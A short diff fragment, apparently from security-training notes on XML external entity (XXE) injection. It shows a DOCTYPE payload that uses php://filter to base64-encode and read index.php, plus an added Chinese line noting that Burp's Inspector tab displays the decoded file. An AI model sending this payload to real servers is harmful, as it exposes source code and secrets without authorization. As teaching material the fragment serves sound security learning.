@@ -97,3 +97,5 @@ Injection:
   <!DOCTYPE email [
     <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   ]>
+
+  Burp 右侧窗格中的 Inspector 选项卡，它就会向我们显示解码后的文件
